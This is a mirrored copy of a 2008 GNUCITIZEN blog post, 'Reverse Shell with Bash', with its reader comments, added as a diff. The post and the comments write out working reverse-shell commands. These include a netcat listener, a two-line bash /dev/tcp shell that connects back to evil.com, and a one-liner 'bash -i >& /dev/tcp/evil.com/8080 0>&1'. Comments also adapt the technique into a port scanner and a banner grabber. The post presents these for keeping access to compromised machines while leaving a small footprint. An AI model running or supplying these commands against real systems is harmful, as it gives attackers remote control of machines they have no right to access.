@@ -1,0 +1,848 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" dir="ltr" lang="en-US">
+	
+<!-- Mirrored from www.gnucitizen.org/blog/reverse-shell-with-bash/ by HTTrack Website Copier/3.x [XR&CO'2010], Sat, 07 Jul 2012 14:49:15 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8"><!-- /Added by HTTrack -->
+<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+		<link rel="profile" href="http://gmpg.org/xfn/11"/>
+		<link rel="pingback" href="../../wordpress/xmlrpc.php" />
+		<link rel="alternate" type="application/rdf+xml" title="GNUCITIZEN" href="../../feed/rdf/index.html"/>
+		<link rel="alternate" type="application/rss+xml" title="GNUCITIZEN" href="../../feed/rss/index.html"/>
+		<link rel="alternate" type="application/atom+xml" title="GNUCITIZEN" href="../../feed/atom/index.html"/>
+		<link rel="stylesheet" type="text/css" href="../../wordpress/wp-content/themes/gnucitizen.org-v2/style.css"/>
+		<title>GNUCITIZEN &raquo; Reverse Shell with Bash</title>
+			<meta name="google-site-verification" content="yfE2zXU6xxSUp1CWarDop_6vVdGUUplpLF8P5Xe2fWM"/>
+	<link rel="icon" href="../../wordpress/wp-content/themes/gnucitizen.org-v2/styles/images/favicon.ico" type="image/x-icon"/>
+	<link rel="alternate" type="application/rss+xml" title="GNUCITIZEN Comments" href="http://feedproxy.google.com/gnucitizenComments"/>
+	<link rel="alternate" type="application/rss+xml" title="GNUCITIZEN Group" href="http://feedproxy.google.com/gnucitizenGroup"/>
+	<link rel="stylesheet" href="../../wordpress/wp-content/themes/gnucitizen.org-v2/scriptlets/slimbox2/slimbox2.css" type="text/css" media="screen"/>
+	<script src="../../wordpress/wp-content/themes/gnucitizen.org-v2/scripts/jquery.core.js" type="text/javascript"></script>
+	<script src="../../wordpress/wp-content/themes/gnucitizen.org-v2/scriptlets/slimbox2/slimbox2.js" type="text/javascript"></script>
+	<script src="../../wordpress/wp-content/themes/gnucitizen.org-v2/scripts/gnucitizen.common.js" type="text/javascript"></script>
+<link rel="alternate" type="application/rss+xml" title="GNUCITIZEN &raquo; Reverse Shell with Bash Comments Feed" href="feed/index.html" />
+<link rel="EditURI" type="application/rsd+xml" title="RSD" href="../../wordpress/xmlrpc0db0.php?rsd" />
+<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="http://www.gnucitizen.org/wordpress/wp-includes/wlwmanifest.xml" /> 
+<link rel='prev' title='Default key algorithm in Thomson and BT Home Hub routers' href='../default-key-algorithm-in-thomson-and-bt-home-hub-routers/index.html' />
+<link rel='next' title='There is no spoon&#8230;' href='../there-is-no-spoon/index.html' />
+<meta name="generator" content="WordPress 3.3.2" />
+<link rel='canonical' href='index.html' />
+<link rel='shortlink' href='../../index9ab8.html?p=813' />
+<link rel="alternate" type="application/rss+xml" title="GNUCITIZEN Network" href="http://feedproxy.google.com/gnucitizenNetwork"/>	</head>
+	
+	<body id="single" class="blog">
+		<div id="header">
+			<h1><a href="../../index.html"><span>GNUCITIZEN</span></a></h1>
+			<p><span>Information Security Think Tank</span></p>
+		</div>
+
+<div id="navigation">
+	<h2>Navigation</h2>
+	<ul>
+		<li class="cat-item cat-item-2"><a href="../../categories/blog/index.html" title="View all posts filed under Blog">Blog</a></li>
+		<li class="page_item page-item-266"><a href="../../archive/index.html">Archive</a></li>
+<li class="page_item page-item-236"><a href="../../about/index.html">About</a></li>
+<li class="page_item page-item-336"><a href="../../index.html">Home</a></li>
+			</ul>
+</div>
+
+<div id="content">
+			<div id="entry">
+							<div id="post-813" class="post">
+	<div class="post-title"><h2><span>Reverse Shell with Bash</span></h2></div>
+	<div class="post-date"><span>published:</span> April 19th, 2008</div>
+	<div class="post-content"><div class="single-content-top-widgets"></div><p>I am stuck at the Dubai International Airport and I have nothing else interesting to do. So, I though I might share a simple technique which will go into the <a href="../agile-hacking/index.html">Agile Hacking</a> project. Here I will show you how to create a reverse command shell without using any 3rd-party tools such as the all mighty netcat.</p>
+
+<p>When we compromise a machine we often need to provide ourselves with a user friendly access to the system. This is where command shells come into place. The typical shell consists of a generic network client, typically netcat, listening on a remote port which pipes output into something like bash or any other command shell. Another type of shell is the reverse shell which consists of a generic network client, again something like netcat, connecting to the attacker&#8217;s machine and piping input to bash. Most of the time, the attacker will use netcat, because this tool can be easily found on most system or easily compiled from source if required.</p>
+
+<p>Although netcat is very useful, and you may have to use it in most cases, here is a simple technique which emulates what netcat does but it relies on bash only. Let&#8217;s see how.</p>
+
+<ul>
+<li>In step one we start a listening service on our box. We can use netcat, or whatever you might have at hand.<pre><code>$ nc -l -p 8080 -vvv</code></pre></li>
+<li>On the target we have to perform some bash-fu. We will create a new descriptor which is assigned to a network node. Then we will read and write to that descriptor.<pre><code>$ exec 5<>/dev/tcp/evil.com/8080
+$ cat <&#038;5 | while read line; do $line 2>&#038;5 >&#038;5; done</code></pre></li>
+</ul>
+
+<p>There you go. Now everything we type in our local listening server will get executed on the target and the output of the commands will be piped back. Keep in mind that we don&#8217;t use any 3rd-party tools on the target but its default shell. This technique comes handy in many situations and it leaves very small footprint on the targeted system.</p><div class="single-content-bottom-widgets"></div></div>
+		<div class="post-links"><a href="index.html">more</a> | <a href="index.html#post-comments">comments</a> | <a href='feed/index.html'>comments rss</a> | posted by <a href="../../author/pdp/index.html" title="Posts by pdp" rel="author">pdp</a></div>
+	<div class="post-tags">Tags: <a href="../../tags/agile-hacking/index.html" rel="tag">Agile Hacking</a> | <a href="../../tags/bash/index.html" rel="tag">bash</a> | <a href="../../tags/shell/index.html" rel="tag">shell</a></div></div>
+				
+
+				<div id="post-comments">
+					<div class="comment byuser comment-author-pagvac even thread-even depth-1" id="comment-119028">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/0367b81839d31a5fa3d7bea79ef71b9e?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='../application-layer-anti-virusfirewall/index.html' rel='external nofollow' class='url'>Adrian 'pagvac' Pastor</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-119028">
+			April 19, 2008 at 1:17 pm</a>		</div>
+
+		<p>This is the kind of stuff I like. As we tend to say: &#8220;there is always an easier way to solve the problem&#8221;.</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment odd alt thread-odd thread-alt depth-1" id="comment-119036">
+				<div class="comment-author vcard">
+		<img alt='' src='http://1.gravatar.com/avatar/18067dcaf3d81bfd125eefc797c20e5e?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">ernie</cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-119036">
+			April 19, 2008 at 2:28 pm</a>		</div>
+
+		<p>This shit doesn&#8217;t work everywhere, you need to have compiled support in bash for it, and since it&#8217;s very broken, most distributions do not ship bash enabled with this feature.</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment even thread-even depth-1" id="comment-119041">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/01822efaf66e4b81d6f947cba7e0613a?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">Anonymous</cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-119041">
+			April 19, 2008 at 3:00 pm</a>		</div>
+
+		<p>Nice, but I preferred the original write-up ;) <a href="http://labs.neohapsis.com/2008/04/17/connect-back-shell-literally/" rel="nofollow">http://labs.neohapsis.com/2008.....literally/</a></p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment odd alt thread-odd thread-alt depth-1" id="comment-119042">
+				<div class="comment-author vcard">
+		<img alt='' src='http://1.gravatar.com/avatar/d489a8c17c4e9796fbe57a8f10073511?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='http://ubuntuswitch.blogspot.com/' rel='external nofollow' class='url'>Tecky</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-119042">
+			April 19, 2008 at 3:16 pm</a>		</div>
+
+		<p>To bad is not working on debian distributions.</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment even thread-even depth-1" id="comment-119043">
+				<div class="comment-author vcard">
+		<img alt='' src='http://1.gravatar.com/avatar/d1b4bb13f49bd2d1c061d33109f9962f?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='http://dude/' rel='external nofollow' class='url'>dude dyde</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-119043">
+			April 19, 2008 at 3:21 pm</a>		</div>
+
+		<p>give credit where its due.  this was posted yesterday on some other sites prior.</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment odd alt thread-odd thread-alt depth-1" id="comment-119044">
+				<div class="comment-author vcard">
+		<img alt='' src='http://1.gravatar.com/avatar/3e8f21136dcd2cafc2e684fd1546c45f?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">kcghost</cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-119044">
+			April 19, 2008 at 3:38 pm</a>		</div>
+
+		<p>a cool trick, but is there a convenient way of doing this in debian? Debian doesnt have the &#8220;/dev/tcp&#8221; feature as part of its bash by default, is there a way to get around that and use something else?</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment byuser comment-author-pdp bypostauthor even thread-even depth-1" id="comment-119046">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/c4db4e65c9f09f2a373fcaefa5e2bfb4?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='../../about/pdp.html' rel='external nofollow' class='url'>pdp</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-119046">
+			April 19, 2008 at 3:43 pm</a>		</div>
+
+		<p>first of all, I find this feature working on far too many systems. Second, similar things can be done with TCL and 3rd, I don&#8217;t read every single blog out there to know that someone has blogged about it as well, neither I claim that it is new. If someone has posted similar technique somewhere else, it is just a coincidence. On another note, giving credits for something like this, is a bit stupid. :) It is like giving credits to someone for writing a <q>for</q> loop in bash. This is a feature not an ingenious hack. Also, my example significantly differs from the example provided by the blog post suggested above. thanks for the heads up and apologies to those who think that I have ripped off their work. It is certainly not the case.</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment odd alt thread-odd thread-alt depth-1" id="comment-119047">
+				<div class="comment-author vcard">
+		<img alt='' src='http://1.gravatar.com/avatar/b28d5fe8da784e36235a487c03a47353?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">otze</cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-119047">
+			April 19, 2008 at 3:44 pm</a>		</div>
+
+		<p>Nice one, but on my system the man page of bash states the following: :( NOTE: Bash, as packaged for Debian, does not support using the /dev/tcp and /dev/udp files.</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment byuser comment-author-pdp bypostauthor even thread-even depth-1" id="comment-119048">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/c4db4e65c9f09f2a373fcaefa5e2bfb4?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='../../about/pdp.html' rel='external nofollow' class='url'>pdp</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-119048">
+			April 19, 2008 at 3:45 pm</a>		</div>
+
+		<p>if you don&#8217;t have this feature compiled you can use TCL which is most likely installed on the system. Now, this defeats the purpose of the technique presented here but it might be better in some situations when you are restricted in terms of being able to upload netcat for example. For more information on using TCL socket features, read the following link: <a href="http://www.tcl.tk/man/tcl8.4/TclCmd/socket.htm" rel="nofollow">http://www.tcl.tk/man/tcl8.4/TclCmd/socket.htm</a></p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment byuser comment-author-pdp bypostauthor odd alt thread-odd thread-alt depth-1" id="comment-119049">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/c4db4e65c9f09f2a373fcaefa5e2bfb4?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='../../about/pdp.html' rel='external nofollow' class='url'>pdp</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-119049">
+			April 19, 2008 at 3:53 pm</a>		</div>
+
+		<p>otze, unfortunately Debian does not support it. keep in mind that Debian mainly uses very old <q>stable</q> packages. Which is good and bad at the same time.</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment even thread-even depth-1" id="comment-119061">
+				<div class="comment-author vcard">
+		<img alt='' src='http://1.gravatar.com/avatar/35cf3c69b0340172405fb98958a6cfdf?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">Venom23</cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-119061">
+			April 19, 2008 at 5:10 pm</a>		</div>
+
+		<p>You are my idol #1</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment odd alt thread-odd thread-alt depth-1" id="comment-119062">
+				<div class="comment-author vcard">
+		<img alt='' src='http://1.gravatar.com/avatar/35cf3c69b0340172405fb98958a6cfdf?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">Venom23</cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-119062">
+			April 19, 2008 at 5:22 pm</a>		</div>
+
+		<p>Yes! Works fine on Solaris 9 and 10. Always had problems getting a netcat compiled on Solaris. Hate gcc problems on Solaris. The netcat version provided by sunfreeware.com does not include the &#8220;-e&#8221; option for bidirectional communication.</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment even thread-even depth-1" id="comment-119123">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/a47fd875e50eda99c98b3160ec3df5ba?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">Sam</cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-119123">
+			April 20, 2008 at 6:37 am</a>		</div>
+
+		<p>I tried this on a ubuntu server and it does not work  in it&#8217;s default configuration. If you build the bash using the use &#8211;enable-net-redirections build flag it will work. Just in case someone else was wondering why it wouldn&#8217;t work.</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment odd alt thread-odd thread-alt depth-1" id="comment-119192">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/2ed1cf60e18830bcdff9bf232faee040?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">Adri</cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-119192">
+			April 20, 2008 at 8:06 pm</a>		</div>
+
+		<p>Nice stuff, I really love this website :D</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment even thread-even depth-1" id="comment-119205">
+				<div class="comment-author vcard">
+		<img alt='' src='http://1.gravatar.com/avatar/5e10822e3d033324c2a0f8fecf2450cc?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='http://none/' rel='external nofollow' class='url'>Jim Kelly</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-119205">
+			April 20, 2008 at 9:35 pm</a>		</div>
+
+		<p>I checked the bash man page on Mac OS X 10.5.2 and it DOES support <code>/dev/tcp</code>!!</p>
+<p>jk</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment odd alt thread-odd thread-alt depth-1" id="comment-119206">
+				<div class="comment-author vcard">
+		<img alt='' src='http://1.gravatar.com/avatar/5e10822e3d033324c2a0f8fecf2450cc?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='http://none/' rel='external nofollow' class='url'>Jim Kelly</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-119206">
+			April 20, 2008 at 9:45 pm</a>		</div>
+
+		<p>I just tried it on Mac OS X Leopard and it works!! caveat I connected to and from localhost so my next test, time willing will be to try to/from another host. Nothing shows up on the victim host, all std out shows up on attacker side ;-) pdp awesome awesome tip!!!</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment even thread-even depth-1" id="comment-119207">
+				<div class="comment-author vcard">
+		<img alt='' src='http://1.gravatar.com/avatar/779cb6e06b596400446c3076bb13785a?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='http://www.securitybrigade.com/' rel='external nofollow' class='url'>Yash Kadakia</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-119207">
+			April 20, 2008 at 9:59 pm</a>		</div>
+
+		<p>Thanks for the tip! Its an interesting concept to minimize the footprint on the client machine.</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment odd alt thread-odd thread-alt depth-1" id="comment-119209">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/6125da169bce604fdf9bd2d55233e5bc?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">tix</cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-119209">
+			April 20, 2008 at 10:05 pm</a>		</div>
+
+		<p>you can remove the <code>cat &lt;&amp;5</code>, will be:</p>
+<pre><code>while read line 0&lt;&amp;5; do $line 2&gt;&amp;5 &gt;&amp;5; done</code></pre>
+<p>there is also the <code>$REPLY</code> var of the read builtin command.</p>
+<p>thnks for the stuff gnucitizen.</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment even thread-even depth-1" id="comment-119272">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/6c6d4834c788c4a760b164e358245d5d?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">nicolasfr</cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-119272">
+			April 21, 2008 at 8:38 am</a>		</div>
+
+		<p>Why using two lines/commands? A one liner version:</p>
+<pre><code>$ bash -i &gt;&amp; /dev/tcp/evil.com/8080 0&gt;&amp;1</code></pre>
+<p>Note: <code>/dev/tcp</code> support is enabled by default on Redhat. Disabled on Debian. Would be nice to list here support for other well known distro (Suse?).</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment odd alt thread-odd thread-alt depth-1" id="comment-119352">
+				<div class="comment-author vcard">
+		<img alt='' src='http://1.gravatar.com/avatar/5e10822e3d033324c2a0f8fecf2450cc?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='http://none/' rel='external nofollow' class='url'>Jim Kelly</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-119352">
+			April 21, 2008 at 10:45 pm</a>		</div>
+
+		<p>Ok here is an idea of how to turn this into a port scanner: Say you are on box 192.168.1.2 and you want to port scan ports 79,80,81 on 192.168.1.1 do the following all on one line:</p>
+<pre><code>for i in 79 80 81; do echo $i &amp; bash -i &gt;&amp; /dev/tcp/192.168.1.1/$i 0&gt;&amp;1;done</code></pre>
+<p>What you end up with is something like this:</p>
+<pre><code>bash-3.2$ for i in 79 80 81; do echo $i &amp; bash -i &gt;&amp; /dev/tcp/192.168.1.1/$i 0&gt;&amp;1;done
+[1] 5579
+79
+bash: connect: Connection refused
+bash: /dev/tcp/192.168.1.1/79: Connection refused
+[1]+  Done                    echo $i
+[1] 5581
+80
+[1]+  Done                    echo $i
+[1] 5584
+81
+bash: connect: Connection refused
+bash: /dev/tcp/192.168.1.1/81: Connection refused
+[1]+  Done                    echo $i
+bash-3.2$ for i in 79 80 81; do echo $i &amp; bash -i &gt;&amp; /dev/tcp/192.168.1.1/$i 0&gt;&amp;1;done</code></pre>
+<p>Closed ports give you back a &#8220;Connection refused&#8221;</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment even thread-even depth-1" id="comment-119356">
+				<div class="comment-author vcard">
+		<img alt='' src='http://1.gravatar.com/avatar/5e10822e3d033324c2a0f8fecf2450cc?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='http://none/' rel='external nofollow' class='url'>Jim Kely</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-119356">
+			April 21, 2008 at 11:01 pm</a>		</div>
+
+		<p>LOL Google is truely my friend: <a href="http://www.oreilly.com/pub/h/5299" rel="nofollow">http://www.oreilly.com/pub/h/5299</a> A tcp and udp portscanner implimented in Bash ;-)</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment byuser comment-author-pdp bypostauthor odd alt thread-odd thread-alt depth-1" id="comment-119395">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/c4db4e65c9f09f2a373fcaefa5e2bfb4?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='../../about/pdp.html' rel='external nofollow' class='url'>pdp</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-119395">
+			April 22, 2008 at 6:11 am</a>		</div>
+
+		<p>sweet!</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment even thread-even depth-1" id="comment-119448">
+				<div class="comment-author vcard">
+		<img alt='' src='http://1.gravatar.com/avatar/564e44b6b33cc73b9bb444ea8f22694c?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">Marchiner</cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-119448">
+			April 22, 2008 at 3:15 pm</a>		</div>
+
+		<p>It works ok on debian, but only using TCL! :D But works fine! Thx for nice post pdp!</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment odd alt thread-odd thread-alt depth-1" id="comment-119450">
+				<div class="comment-author vcard">
+		<img alt='' src='http://1.gravatar.com/avatar/564e44b6b33cc73b9bb444ea8f22694c?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">Marchiner</cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-119450">
+			April 22, 2008 at 3:51 pm</a>		</div>
+
+		<p>Ops sorry.. really don work on debian. Works on Redhat Enterprise 4 and 5.</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment even thread-even depth-1" id="comment-119457">
+				<div class="comment-author vcard">
+		<img alt='' src='http://1.gravatar.com/avatar/564e44b6b33cc73b9bb444ea8f22694c?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">Marchiner</cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-119457">
+			April 22, 2008 at 4:02 pm</a>		</div>
+
+		<p>Just to complement&#8230; i know this post its about the reverse shell.  But &#8220;debian users&#8221; whatch this post about Default-bash:/dev/tcp <a href="http://bugs.debian.org/cgi-bin/bugreport.cgi?bug=146464" rel="nofollow">http://bugs.debian.org/cgi-bin.....bug=146464</a></p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment odd alt thread-odd thread-alt depth-1" id="comment-119555">
+				<div class="comment-author vcard">
+		<img alt='' src='http://1.gravatar.com/avatar/5e10822e3d033324c2a0f8fecf2450cc?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='http://none/' rel='external nofollow' class='url'>macubergeek</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-119555">
+			April 23, 2008 at 10:18 am</a>		</div>
+
+		<p>Marchiner: wow this bug report goes back to 2002! How much longer till it&#8217;s fixed ;-)</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment even thread-even depth-1" id="comment-119620">
+				<div class="comment-author vcard">
+		<img alt='' src='http://1.gravatar.com/avatar/5e10822e3d033324c2a0f8fecf2450cc?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='http://none/' rel='external nofollow' class='url'>macubergeek</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-119620">
+			April 23, 2008 at 10:55 pm</a>		</div>
+
+		<p>Ok this is off scope for this thread, and the moderator may not want it but here&#8217;s a way to use /dev/tcp to banner a web server:</p>
+<pre><code>#!/bin/bash
+exec 3&lt;&gt;/dev/tcp/$1/80
+echo -e "Get /simple?se=1 HTTP/1.0\n" &gt;&amp;3
+cat &lt;&amp;3</code></pre>
+<p>You&#8217;d feed the <a href="http://www.whatever.com/" rel="nofollow">http://www.whatever.com</a> on the command line.</p>
+<p>usage:</p>
+<pre><code>./script <a href="http://www.whatever.com/" rel="nofollow">http://www.whatever.com</a></code></pre>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment odd alt thread-odd thread-alt depth-1" id="comment-119977">
+				<div class="comment-author vcard">
+		<img alt='' src='http://1.gravatar.com/avatar/5e10822e3d033324c2a0f8fecf2450cc?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='http://none/' rel='external nofollow' class='url'>macubergeek</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-119977">
+			April 26, 2008 at 3:56 pm</a>		</div>
+
+		<p>Correction: script should read:</p>
+<pre><code>#!/bin/bash
+exec 3 /dev/tcp/$1/80
+echo -e "Get /simple?se=1 HTTP/1.0\n" &gt;&amp;3
+cat &lt;&amp;3</code></pre>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment even thread-even depth-1" id="comment-120337">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/8150b9645442ee255c68ec036085fdff?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">f0rg3</cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-120337">
+			April 30, 2008 at 12:09 am</a>		</div>
+
+		<p>Useful, Thanks.</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment odd alt thread-odd thread-alt depth-1" id="comment-120580">
+				<div class="comment-author vcard">
+		<img alt='' src='http://1.gravatar.com/avatar/f3b0b062823d93fc92c37594e4b2c8af?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='http://blog.greyhat.in/' rel='external nofollow' class='url'>PsyEcho</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-120580">
+			May 3, 2008 at 11:31 am</a>		</div>
+
+		<p>Thanks &#8216;pdp&#8217;. Nice concept &amp; article. Though doesn&#8217;t work for my default Debian base, but surely gonna come handy for research! Kudos and keep up the good work :) Cheers.</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment even thread-even depth-1" id="comment-120585">
+				<div class="comment-author vcard">
+		<img alt='' src='http://1.gravatar.com/avatar/5e10822e3d033324c2a0f8fecf2450cc?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='http://none/' rel='external nofollow' class='url'>macubergeek</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-120585">
+			May 3, 2008 at 1:09 pm</a>		</div>
+
+		<p>PDP Yeh this was old school goodness ;-) I love the idea of using what&#8217;s already there. Now what I&#8217;d like is an equivalent on windows!</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment byuser comment-author-admin odd alt thread-odd thread-alt depth-1" id="comment-120586">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/02ad2ea464a98737d78746fa7b7c36b6?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='../../index.html' rel='external nofollow' class='url'>pdp</a></cite> <span class="says">says:</span>		</div>
+
